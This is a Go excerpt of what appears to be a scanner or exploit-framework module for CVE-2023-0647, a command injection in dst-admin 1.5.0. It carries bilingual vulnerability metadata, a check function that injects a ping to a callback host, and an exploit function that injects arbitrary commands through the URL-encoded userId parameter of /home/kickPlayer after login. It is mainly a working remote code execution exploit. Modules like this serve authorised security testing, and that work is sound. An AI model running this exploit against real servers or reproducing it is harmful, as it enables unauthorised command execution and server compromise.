...
func init() {
	expJson := `{
    "Name": "dst-admin kickPlayer RCE Vulnerability (CVE-2023-0647)",
    ...
    "Level": "2",
    "Impact": "<p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/kickPlayer. Command injection can be performed through the parameter command, and the attacker can obtain server privileges.</p>",
    ...
    "Translation": {
        "CN": {
            "Name": "dst-admin kickPlayer 远程命令执行漏洞（CVE-2023-0647）",
            "Product": "dst-admin",
            "Description": "<p>dst-admin是qinming99个人开发者的一个用 Java 语言编写的 web 程序。<br></p><p>dst-admin 1.5.0版本存在命令注入漏洞，该漏洞源于文件home/kickPlayer存在未知功能，通过参数command可以进行命令注入，攻击者可获取服务器权限。<br></p>",
            ...
            "Impact": "<p>dst-admin 1.5.0版本存在命令注入漏洞，该漏洞源于文件home/kickPlayer存在未知功能，通过参数command可以进行命令注入，攻击者可获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
        ...
        "EN": {
            ...
            "Impact": "<p>There is a command injection vulnerability in dst-admin version 1.5.0. The vulnerability comes from the unknown function of the file home/kickPlayer. Command injection can be performed through the parameter command, and the attacker can obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			...
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "登陆成功") {
				uri2 := fmt.Sprintf("/home/kickPlayer?userId=%%5C%%22)%%5Cn%%22%%26ping%%20%s%%26screen%%20-S%%20%%22DST_CAVES%%22%%20-p%%200%%20-X%%20stuff%%20%%22TheNet%%3AKick(%%5C%%22", checkUrl)
		...
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			...
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "登陆成功") {
				uri2 := fmt.Sprintf("/home/kickPlayer?userId=%%5C%%22)%%5Cn%%22%%26%s%%26screen%%20-S%%20%%22DST_CAVES%%22%%20-p%%200%%20-X%%20stuff%%20%%22TheNet%%3AKick(%%5C%%22", url.QueryEscape(cmd))
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", resp.Cookie)
